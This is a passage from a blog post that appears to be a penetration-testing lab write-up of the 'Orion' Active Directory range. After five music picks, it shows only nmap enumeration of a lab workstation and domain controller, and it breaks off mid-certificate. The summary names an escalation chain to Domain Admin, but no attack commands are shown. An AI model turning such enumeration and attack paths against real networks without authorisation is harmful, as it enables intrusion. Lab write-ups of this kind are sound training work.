---
title: "Orion (HackSmarter) — AD Range to Domain Admin"
date: 2026-10-15
draft: false
tags: ["active-directory", "oscp", "writeup", "windows", "certipy", "bloodhound"]
categories: ["Writeups"]
cover:
    image: "orion-01.png"
    alt: "Orion AD range"
    relative: true
ShowToc: true
TocOpen: false
summary: "Internal pen test against the Orion AD range: anonymous SMB to NTLM theft, BloodHound attack pathing, shadow credentials, GodPotato, and an ESC1 cert abuse to Domain Admin. Plus five songs I've been listening to."
---

## Welcome

Before the writeup — five tracks from five different genres I've been spinning lately.

### 1. Gabber / Hardcore / Speedcore
**Nightwatch — Army of Terror**

{{< youtube Vl7CUCzwJ2A >}}

Love the rhythmic vibe of this one, almost oscillating in a sense. Spooky because it's around Halloween too.

### 2. Jazz
**Bobbi Humphrey — My Little Girl**

{{< youtube kbckHO2JgS8 >}}

From Bobbi Humphrey's *Satin Doll* (1974). This one makes me tear up a bit — a very sentimental track.

### 3. Experimental
**Einstürzende Neubauten — Sado Masodub**

{{< youtube qfUgH6BL_Ik >}}

Experimental group out of 1980s Germany. A brash track, but I love it. Might be tough if you're not into noise — absolute favorite right now.

### 4. Shoegaze
**Majesty Crush — Boyfriend**

{{< youtube 0kveJLi6SdQ >}}

Think I posted this before but I absolutely love it. Been on heavy rotation lately.

### 5. Guitar / Instrumental
**Will Ackerman — Our Wedding Song**

{{< youtube B48JAjsUPWA >}}

Just listen to this one, enough said. It's so beautiful.


---

## Orion — Technical Write-Up


#### Objective

```JavaScript
Orion Corp has hired you to perform an internal penetration test against two machines within their network. Your task is to identify all vulnerabilities and (if possible) elevate your privileges to Domain Admin.
```

No Initial Creds.

![](orion-02.png)

#### Initial Enumeration of IT Workstation

```
Open 10.0.0.6:135
Open 10.0.0.6:139
Open 10.0.0.6:445
Open 10.0.0.6:3389
Open 10.0.0.6:5985
Open 10.0.0.6:49668
Open 10.0.0.6:49674
```

Not a ton to go on, I see `WinRM, SMB, RDP` and couple `RPC` ports.

```
PORT      STATE SERVICE       REASON          VERSION
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127
| rdp-ntlm-info: 
|   Target_Name: ORION
|   NetBIOS_Domain_Name: ORION
|   NetBIOS_Computer_Name: WS-IT
|   DNS_Domain_Name: orion.local
|   DNS_Computer_Name: WS-IT.orion.local
|   DNS_Tree_Name: orion.local
|   Product_Version: 10.0.26100
|_  System_Time: 2026-10-15T15:47:11+00:00
| ssl-cert: Subject: commonName=WS-IT.orion.local
| Issuer: commonName=WS-IT.orion.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-10-02T15:45:35
| Not valid after:  2027-04-03T15:45:35
| MD5:     2f8c a10b 70b8 4159 3b01 2152 a10f 704d
| SHA-1:   75cf 5319 f457 7e6e 88be f34d d063 ecbf 742e a31f
| SHA-256: a91b 9c34 70b5 71dd bb7e 229d 6f9f 017f b3de d13a ecda 10a3 b587 3706 cde2 1a21
| -----BEGIN CERTIFICATE-----
| MIIC5jCCAc6gAwIBAgIQFfcMYcbksYNGcDlxPa+lezANBgkqhkiG9w0BAQsFADAc
| MRowGAYDVQQDExFXUy1JVC5vcmlvbi5sb2NhbDAeFw0yNjEwMDIxNTQ1MzVaFw0y
| NzA0MDMxNTQ1MzVaMBwxGjAYBgNVBAMTEVdTLUlULm9yaW9uLmxvY2FsMIIBIjAN
| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwbXMreSEsH7wSWYfyXpG8WtqdRRe
| qBHxzKJsRFH6na016vkfwmmx3/klu/31UTzo0rG30uOyXzd3YrxFuzC6YMzXHnBx
| DZpc1BJjz2Y26r1jA5xeja8cN3gzq368ywBUds2AFOf664AMRCPi0aUZOttlykhm
| Mq13e/xOQq74aJPHtky4e60fafgVN7Efr3JvUzyq8o00ks61PzBpBeOE10yMp0fq
| RJ9VVjkyBD7cVKJ4evaEJ7OEDVFZjwvJ4qhFmlG3fwZlrNDURRrW5IFONAtgUmvj
| xZbQHvZzS3aq10XEZslNEjnniVbENg910ZqiuU920mbqKd9EbIaAJBrYKQIDAQAB
| oyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcN
| AQELBQADggEBAD3lCqIt0mJPDJdCIFDkedJYCG7jJy9uDKS3lUkAs4LkoMvD+JzQ
| HCikDcZryM+59VbtLtVjWFmgPv6ZnqvkdjIGcE2xiRl3HAIJM3TObGu491Y+UR0f
| 74sduW02wdkVzpABK2iRSFhSZvtnroI2iUnnV0p7JiDbj5pbO7ZiDXgfBXCK05Tz
| xev93Uesy5KJoVVkDoAZoeuF5yD7dAcb65b6dhHHBmf+Elt57yYaSnH3bVbYeFzI
| OCOy97Ou67xNsaeMzutXg7bmGjj4roglG5C7ajpB0e5nt40IkDjSIITbUVfOq8aY
| TWZUXHHcmh36PxSWRAA5wjAZlom2BYXdg1o=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.99%I=7%D=10/15%Time=6AD0F51A%P=x86_64-pc-linux-gnu%r(T
SF:erminalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02
SF:\0\0\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
TCP/IP fingerprint:
SCAN(V=7.99%E=4%D=10/15%OT=135%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=6AD0F576%P=x86_64-pc-linux-gnu)
SEQ(SP=105%GCD=1%ISR=10C%TI=I%TS=A)
SEQ(SP=106%GCD=2%ISR=10C%TI=I%TS=A)
OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11%O5=M578NW8ST11%O6=M578ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFFF)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=N)

Uptime guess: 0.039 days (since Thu Oct 15 10:51:14 2026)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| nbstat: NetBIOS name: WS-IT, NetBIOS user: <unknown>, NetBIOS MAC: 0e:ff:e2:45:5e:e1 (unknown)
| Names:
|   WS-IT<00>            Flags: <unique><active>
|   ORION<00>            Flags: <group><active>
|   WS-IT<20>            Flags: <unique><active>
| Statistics:
|   0e ff e2 45 5e e1 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_clock-skew: mean: 50s, deviation: 0s, median: 49s
| smb2-time: 
|   date: 2026-10-15T15:47:12
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 11095/tcp): CLEAN (Timeout)
|   Check 2 (port 27759/tcp): CLEAN (Timeout)
|   Check 3 (port 46110/udp): CLEAN (Timeout)
|   Check 4 (port 41289/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   74.88 ms 192.168.211.1
2   75.30 ms WS-IT.orion.local (10.0.0.6)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:47
Completed NSE at 11:47, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:47
Completed NSE at 11:47, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:47
Completed NSE at 11:47, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.20 seconds
           Raw packets sent: 101 (8.752KB) | Rcvd: 36 (2.080KB)
```

#### Initial Enumeration of DC01


```
Discovered open port 445/tcp on 10.0.0.5
Discovered open port 139/tcp on 10.0.0.5
Discovered open port 3389/tcp on 10.0.0.5
Discovered open port 53/tcp on 10.0.0.5
Discovered open port 135/tcp on 10.0.0.5
Discovered open port 49743/tcp on 10.0.0.5
Discovered open port 49726/tcp on 10.0.0.5
Discovered open port 636/tcp on 10.0.0.5
Discovered open port 464/tcp on 10.0.0.5
Discovered open port 593/tcp on 10.0.0.5
Discovered open port 49677/tcp on 10.0.0.5
Discovered open port 49664/tcp on 10.0.0.5
Discovered open port 49666/tcp on 10.0.0.5
Discovered open port 9389/tcp on 10.0.0.5
Discovered open port 88/tcp on 10.0.0.5
Discovered open port 3269/tcp on 10.0.0.5
Discovered open port 49678/tcp on 10.0.0.5
Discovered open port 49819/tcp on 10.0.0.5
Discovered open port 389/tcp on 10.0.0.5
Discovered open port 49668/tcp on 10.0.0.5
Discovered open port 3268/tcp on 10.0.0.5
Discovered open port 49697/tcp on 10.0.0.5
Discovered open port 5985/tcp on 10.0.0.5
Discovered open port 49670/tcp on 10.0.0.5
```

```
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-10-15 15:39:53Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: orion.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.orion.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.orion.local
| Issuer: commonName=orion-DC01-CA/domainComponent=orion
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-10-03T16:27:30
| Not valid after:  2027-10-03T16:27:30
| MD5:     4a14 7363 1a5a 86ec ed24 876c feeb 6666
| SHA-1:   13c6 0c15 90e5 144a 9274 fc8c 7bc4 b1d2 8fbc 5f45
| SHA-256: 0ef1 1b2f 5005 fd57 fd68 8352 55de a90f ceec 2915 bb9f 2670 0fe6 8d8b f5d3 980b
| -----BEGIN CERTIFICATE-----
| MIIGKTCCBRGgAwIBAgITQwAAAAIajE0DoiMyvwAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBGMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFTATBgoJkiaJk/IsZAEZFgVvcmlv
| bjEWMBQGA1UEAxMNb3Jpb24tREMwMS1DQTAeFw0yNjEwMDMxNjI3MzBaFw0yNzEw
| MDMxNjI3MzBaMBsxGTAXBgNVBAMTEERDMDEub3Jpb24ubG9jYWwwggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQDThWRF/wk3Zq4Cn7JugEwVfGXT1Rn/cTK5
| v7+CusuC+TkVbegdPY9LmCM894Fl/Qzy18+6cA8YbA0KoNHLJut/dpjidh2TQ0N+
| E/S970+4oSUbBV52DqQtfw1TzSghe8juN5oNb99G/yr2FMpU/0kBFVzNwNmkZCYG
| hjsTG6b2hh5SRmcsodzHigMoQ64Wn4NUz86KMn9ujLDVZm2tXZZDxTEHJrI/e0FV
| D755IJB0dDE/V1UT4W4T33o8/fvbp7ds7tgkF3LSn1Xeeor7rGe8/7IAoqi30L6g
| 3YTf8Kf7hXU6xgNWGQQXFRLE1NnZw3/FIwu5Hb6ZYXsfI2+Pu+X5AgMBAAGjggM5
| MIIDNTAvBgkrBgEEAYI3FAIEIh4gAEQAbwBtAGEAaQBuAEMAbwBuAHQAcgBvAGwA
| bABlAHIwHQYDVR0lBBYwFAYIKwYBBQUHAwIGCCsGAQUFBwMBMA4GA1UdDwEB/wQE
| AwIFoDB4BgkqhkiG9w0BCQ8EazBpMA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0D
| BAICAIAwCwYJYIZIAWUDBAEqMAsGCWCGSAFlAwQBLTALBglghkgBZQMEAQIwCwYJ
| YIZIAWUDBAEFMAcGBSsOAwIHMAoGCCqGSIb3DQMHMB0GA1UdDgQWBBTwHbbTM0z+
| vA2OasZS48gWkgqeQDAfBgNVHSMEGDAWgBSum2+bOr/0T0PVFeKKAQf5l8LPbDCB
| yAYDVR0fBIHAMIG9MIG6oIG3oIG0hoGxbGRhcDovLy9DTj1vcmlvbi1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9b3Jpb24sREM9bG9jYWw/Y2VydGlm
| aWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1
| dGlvblBvaW50MIG/BggrBgEFBQcBAQSBsjCBrzCBrAYIKwYBBQUHMAKGgZ9sZGFw
| Oi8vL0NOPW9yaW9uLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9b3Jpb24sREM9
| bG9jYWw/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRp
| b25BdXRob3JpdHkwPAYDVR0RBDUwM6AfBgkrBgEEAYI3GQGgEgQQWUEyrJTsHEC8
| VXhwZm3iUIIQREMwMS5vcmlvbi5sb2NhbDBOBgkrBgEEAYI3GQIEQTA/oD0GCisG
| AQQBgjcZAgGgLwQtUy0xLTUtMjEtMjg1MDM3NTI0LTM4MDA3NTg1ODctMzY0MTQz
| OTc5Mi0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQAdqxYrPR2cixMj4ADcEoY5SShK
| JYF8AjU46vMHACQeuEH/q+PkRbZwV5fd67O76LGk9IxPSFRvjnuXBfb9kTEp1zeF
| 58qnP26CCnY1FBxkzxD56m879jI327wQns+ybEM3NjAyHlL2ygrFYtJ5giAS/i2/
| pg6RfKBXj8w7D5hh75+1Rt53U7JrdlXhTl/XMrAveJKgRo1lUFv3uUGRGA/6LAwB
| nSp2GGyQR3iDFJT3edgyJwhCrtSFMafOV4hRx4mLNXAXdp4U4aBJ9/Tm/G9eRvLK
| w13O76EY2DrDiQjoea8i/qVOMHsHac3LL07jot22W0CCtqIkj4MUMuLbTiMy
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: orion.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.orion.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.orion.local
| Issuer: commonName=orion-DC01-CA/domainComponent=orion
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-10-03T16:27:30
| Not valid after:  2027-10-03T16:27:30
| MD5:     4a14 7363 1a5a 86ec ed24 876c feeb 6666
| SHA-1:   13c6 0c15 90e5 144a 9274 fc8c 7bc4 b1d2 8fbc 5f45
| SHA-256: 0ef1 1b2f 5005 fd57 fd68 8352 55de a90f ceec 2915 bb9f 2670 0fe6 8d8b f5d3 980b
| -----BEGIN CERTIFICATE-----
| MIIGKTCCBRGgAwIBAgITQwAAAAIajE0DoiMyvwAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBGMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFTATBgoJkiaJk/IsZAEZFgVvcmlv
| bjEWMBQGA1UEAxMNb3Jpb24tREMwMS1DQTAeFw0yNjEwMDMxNjI3MzBaFw0yNzEw
| MDMxNjI3MzBaMBsxGTAXBgNVBAMTEERDMDEub3Jpb24ubG9jYWwwggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQDThWRF/wk3Zq4Cn7JugEwVfGXT1Rn/cTK5
| v7+CusuC+TkVbegdPY9LmCM894Fl/Qzy18+6cA8YbA0KoNHLJut/dpjidh2TQ0N+
| E/S970+4oSUbBV52DqQtfw1TzSghe8juN5oNb99G/yr2FMpU/0kBFVzNwNmkZCYG
| hjsTG6b2hh5SRmcsodzHigMoQ64Wn4NUz86KMn9ujLDVZm2tXZZDxTEHJrI/e0FV
| D755IJB0dDE/V1UT4W4T33o8/fvbp7ds7tgkF3LSn1Xeeor7rGe8/7IAoqi30L6g
| 3YTf8Kf7hXU6xgNWGQQXFRLE1NnZw3/FIwu5Hb6ZYXsfI2+Pu+X5AgMBAAGjggM5
| MIIDNTAvBgkrBgEEAYI3FAIEIh4gAEQAbwBtAGEAaQBuAEMAbwBuAHQAcgBvAGwA
| bABlAHIwHQYDVR0lBBYwFAYIKwYBBQUHAwIGCCsGAQUFBwMBMA4GA1UdDwEB/wQE
| AwIFoDB4BgkqhkiG9w0BCQ8EazBpMA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0D
| BAICAIAwCwYJYIZIAWUDBAEqMAsGCWCGSAFlAwQBLTALBglghkgBZQMEAQIwCwYJ
| YIZIAWUDBAEFMAcGBSsOAwIHMAoGCCqGSIb3DQMHMB0GA1UdDgQWBBTwHbbTM0z+
| vA2OasZS48gWkgqeQDAfBgNVHSMEGDAWgBSum2+bOr/0T0PVFeKKAQf5l8LPbDCB
| yAYDVR0fBIHAMIG9MIG6oIG3oIG0hoGxbGRhcDovLy9DTj1vcmlvbi1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9b3Jpb24sREM9bG9jYWw/Y2VydGlm
| aWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1
| dGlvblBvaW50MIG/BggrBgEFBQcBAQSBsjCBrzCBrAYIKwYBBQUHMAKGgZ9sZGFw
| Oi8vL0NOPW9yaW9uLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9b3Jpb24sREM9
| bG9jYWw/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRp
| b25BdXRob3JpdHkwPAYDVR0RBDUwM6AfBgkrBgEEAYI3GQGgEgQQWUEyrJTsHEC8
| VXhwZm3iUIIQREMwMS5vcmlvbi5sb2NhbDBOBgkrBgEEAYI3GQIEQTA/oD0GCisG
| AQQBgjcZAgGgLwQtUy0xLTUtMjEtMjg1MDM3NTI0LTM4MDA3NTg1ODctMzY0MTQz
| OTc5Mi0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQAdqxYrPR2cixMj4ADcEoY5SShK
| JYF8AjU46vMHACQeuEH/q+PkRbZwV5fd67O76LGk9IxPSFRvjnuXBfb9kTEp1zeF
| 58qnP26CCnY1FBxkzxD56m879jI327wQns+ybEM3NjAyHlL2ygrFYtJ5giAS/i2/
| pg6RfKBXj8w7D5hh75+1Rt53U7JrdlXhTl/XMrAveJKgRo1lUFv3uUGRGA/6LAwB
| nSp2GGyQR3iDFJT3edgyJwhCrtSFMafOV4hRx4mLNXAXdp4U4aBJ9/Tm/G9eRvLK
| w13O76EY2DrDiQjoea8i/qVOMHsHac3LL07jot22W0CCtqIkj4MUMuLbTiMy
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: orion.local, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.orion.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.orion.local
| Issuer: commonName=orion-DC01-CA/domainComponent=orion
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-10-03T16:27:30
| Not valid after:  2027-10-03T16:27:30
| MD5:     4a14 7363 1a5a 86ec ed24 876c feeb 6666
| SHA-1:   13c6 0c15 90e5 144a 9274 fc8c 7bc4 b1d2 8fbc 5f45
| SHA-256: 0ef1 1b2f 5005 fd57 fd68 8352 55de a90f ceec 2915 bb9f 2670 0fe6 8d8b f5d3 980b
| -----BEGIN CERTIFICATE-----
| MIIGKTCCBRGgAwIBAgITQwAAAAIajE0DoiMyvwAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBGMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFTATBgoJkiaJk/IsZAEZFgVvcmlv
| bjEWMBQGA1UEAxMNb3Jpb24tREMwMS1DQTAeFw0yNjEwMDMxNjI3MzBaFw0yNzEw
| MDMxNjI3MzBaMBsxGTAXBgNVBAMTEERDMDEub3Jpb24ubG9jYWwwggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQDThWRF/wk3Zq4Cn7JugEwVfGXT1Rn/cTK5
| v7+CusuC+TkVbegdPY9LmCM894Fl/Qzy18+6cA8YbA0KoNHLJut/dpjidh2TQ0N+
| E/S970+4oSUbBV52DqQtfw1TzSghe8juN5oNb99G/yr2FMpU/0kBFVzNwNmkZCYG
| hjsTG6b2hh5SRmcsodzHigMoQ64Wn4NUz86KMn9ujLDVZm2tXZZDxTEHJrI/e0FV
| D755IJB0dDE/V1UT4W4T33o8/fvbp7ds7tgkF3LSn1Xeeor7rGe8/7IAoqi30L6g
| 3YTf8Kf7hXU6xgNWGQQXFRLE1NnZw3/FIwu5Hb6ZYXsfI2+Pu+X5AgMBAAGjggM5
| MIIDNTAvBgkrBgEEAYI3FAIEIh4gAEQAbwBtAGEAaQBuAEMAbwBuAHQAcgBvAGwA
| bABlAHIwHQYDVR0lBBYwFAYIKwYBBQUHAwIGCCsGAQUFBwMBMA4GA1UdDwEB/wQE
| AwIFoDB4BgkqhkiG9w0BCQ8EazBpMA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0D
| BAICAIAwCwYJYIZIAWUDBAEqMAsGCWCGSAFlAwQBLTALBglghkgBZQMEAQIwCwYJ
| YIZIAWUDBAEFMAcGBSsOAwIHMAoGCCqGSIb3DQMHMB0GA1UdDgQWBBTwHbbTM0z+
| vA2OasZS48gWkgqeQDAfBgNVHSMEGDAWgBSum2+bOr/0T0PVFeKKAQf5l8LPbDCB
| yAYDVR0fBIHAMIG9MIG6oIG3oIG0hoGxbGRhcDovLy9DTj1vcmlvbi1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9b3Jpb24sREM9bG9jYWw/Y2VydGlm
| aWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1
| dGlvblBvaW50MIG/BggrBgEFBQcBAQSBsjCBrzCBrAYIKwYBBQUHMAKGgZ9sZGFw
| Oi8vL0NOPW9yaW9uLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9b3Jpb24sREM9
| bG9jYWw/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRp
| b25BdXRob3JpdHkwPAYDVR0RBDUwM6AfBgkrBgEEAYI3GQGgEgQQWUEyrJTsHEC8
| VXhwZm3iUIIQREMwMS5vcmlvbi5sb2NhbDBOBgkrBgEEAYI3GQIEQTA/oD0GCisG
| AQQBgjcZAgGgLwQtUy0xLTUtMjEtMjg1MDM3NTI0LTM4MDA3NTg1ODctMzY0MTQz
| OTc5Mi0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQAdqxYrPR2cixMj4ADcEoY5SShK
| JYF8AjU46vMHACQeuEH/q+PkRbZwV5fd67O76LGk9IxPSFRvjnuXBfb9kTEp1zeF
| 58qnP26CCnY1FBxkzxD56m879jI327wQns+ybEM3NjAyHlL2ygrFYtJ5giAS/i2/
| pg6RfKBXj8w7D5hh75+1Rt53U7JrdlXhTl/XMrAveJKgRo1lUFv3uUGRGA/6LAwB
| nSp2GGyQR3iDFJT3edgyJwhCrtSFMafOV4hRx4mLNXAXdp4U4aBJ9/Tm/G9eRvLK
| w13O76EY2DrDiQjoea8i/qVOMHsHac3LL07jot22W0CCtqIkj4MUMuLbTiMy
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: orion.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.orion.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.orion.local
| Issuer: commonName=orion-DC01-CA/domainComponent=orion
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-10-03T16:27:30
| Not valid after:  2027-10-03T16:27:30
| MD5:     4a14 7363 1a5a 86ec ed24 876c feeb 6666
| SHA-1:   13c6 0c15 90e5 144a 9274 fc8c 7bc4 b1d2 8fbc 5f45
| SHA-256: 0ef1 1b2f 5005 fd57 fd68 8352 55de a90f ceec 2915 bb9f 2670 0fe6 8d8b f5d3 980b
| -----BEGIN CERTIFICATE-----
| MIIGKTCCBRGgAwIBAgITQwAAAAIajE0DoiMyvwAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBGMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFTATBgoJkiaJk/IsZAEZFgVvcmlv
| bjEWMBQGA1UEAxMNb3Jpb24tREMwMS1DQTAeFw0yNjEwMDMxNjI3MzBaFw0yNzEw
| MDMxNjI3MzBaMBsxGTAXBgNVBAMTEERDMDEub3Jpb24ubG9jYWwwggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQDThWRF/wk3Zq4Cn7JugEwVfGXT1Rn/cTK5
| v7+CusuC+TkVbegdPY9LmCM894Fl/Qzy18+6cA8YbA0KoNHLJut/dpjidh2TQ0N+
| E/S970+4oSUbBV52DqQtfw1TzSghe8juN5oNb99G/yr2FMpU/0kBFVzNwNmkZCYG
| hjsTG6b2hh5SRmcsodzHigMoQ64Wn4NUz86KMn9ujLDVZm2tXZZDxTEHJrI/e0FV
| D755IJB0dDE/V1UT4W4T33o8/fvbp7ds7tgkF3LSn1Xeeor7rGe8/7IAoqi30L6g
| 3YTf8Kf7hXU6xgNWGQQXFRLE1NnZw3/FIwu5Hb6ZYXsfI2+Pu+X5AgMBAAGjggM5
| MIIDNTAvBgkrBgEEAYI3FAIEIh4gAEQAbwBtAGEAaQBuAEMAbwBuAHQAcgBvAGwA
| bABlAHIwHQYDVR0lBBYwFAYIKwYBBQUHAwIGCCsGAQUFBwMBMA4GA1UdDwEB/wQE
| AwIFoDB4BgkqhkiG9w0BCQ8EazBpMA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0D
| BAICAIAwCwYJYIZIAWUDBAEqMAsGCWCGSAFlAwQBLTALBglghkgBZQMEAQIwCwYJ
| YIZIAWUDBAEFMAcGBSsOAwIHMAoGCCqGSIb3DQMHMB0GA1UdDgQWBBTwHbbTM0z+
| vA2OasZS48gWkgqeQDAfBgNVHSMEGDAWgBSum2+bOr/0T0PVFeKKAQf5l8LPbDCB
| yAYDVR0fBIHAMIG9MIG6oIG3oIG0hoGxbGRhcDovLy9DTj1vcmlvbi1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9b3Jpb24sREM9bG9jYWw/Y2VydGlm
| aWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1
| dGlvblBvaW50MIG/BggrBgEFBQcBAQSBsjCBrzCBrAYIKwYBBQUHMAKGgZ9sZGFw
| Oi8vL0NOPW9yaW9uLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9b3Jpb24sREM9
